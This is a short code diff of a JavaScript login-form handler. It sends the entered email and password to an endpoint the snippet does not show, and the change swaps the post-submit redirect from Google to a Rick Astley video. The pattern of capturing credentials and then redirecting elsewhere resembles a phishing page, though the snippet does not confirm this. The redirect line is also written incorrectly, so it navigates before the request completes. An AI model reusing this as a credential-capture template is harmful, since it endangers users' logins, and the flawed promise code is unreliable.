@@ -12,5 +12,5 @@ myForm.addEventListener('submit', (e) => {
             username: formEmail.value,
             password: formPassword.value
         })
-    }).then(window.location.href = "https://www.google.com");
+    }).then(window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
 })
